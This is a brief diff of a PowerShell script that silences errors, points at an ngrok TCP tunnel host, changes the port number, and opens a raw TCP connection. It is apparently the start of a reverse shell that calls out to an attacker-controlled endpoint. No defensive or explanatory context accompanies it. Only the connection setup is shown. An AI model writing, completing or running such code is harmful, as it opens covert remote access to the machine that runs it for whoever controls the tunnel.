@@ -1,7 +1,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 $h = '0.tcp.ap.ngrok.io'
-$p = 18443
+$p = 10691
 
 try {
     $client = New-Object System.Net.Sockets.TcpClient($h, $p)
